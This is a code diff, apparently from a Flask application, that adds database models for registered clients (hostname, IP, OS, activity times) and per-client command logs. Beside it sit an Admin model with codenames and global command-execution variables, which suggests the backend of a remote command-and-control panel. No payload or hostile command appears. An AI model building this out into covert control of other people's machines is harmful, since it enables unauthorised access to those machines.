@@ -35,7 +35,29 @@ class Admin(db.Model):
 
     def __repr__(self):
         return f"<Admin {self.codename}>"
+# Client Data Table
+class ClientData(db.Model):
+    client_id = db.Column(db.String(64), primary_key=True)  # Unique client ID
+    hostname = db.Column(db.String(128), nullable=False)
+    nickname = db.Column(db.String(128), nullable=False)
+    ip = db.Column(db.String(64), nullable=False)
+    os = db.Column(db.String(128), nullable=False)
+    registered_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)  # Registration timestamp
+    last_active = db.Column(db.DateTime, default=datetime.datetime.utcnow)  # Last active timestamp
 
+    def __repr__(self):
+        return f"<ClientData {self.client_id}>"
+
+# Commands Log Table
+class CommandsLog(db.Model):
+    log_id = db.Column(db.Integer, primary_key=True)
+    client_id = db.Column(db.String(64), db.ForeignKey('client_data.client_id'), nullable=False)  # Foreign Key for client_id
+    commands_history = db.Column(db.Text, nullable=False)  # Command history, JSON or serialized text
+    
+    client = db.relationship('ClientData', backref=db.backref('commands_logs', lazy=True))
+
+    def __repr__(self):
+        return f"<CommandsLog {self.log_id} for {self.client_id}>"
 
 command_to_execute = ""
 execution_result = ""
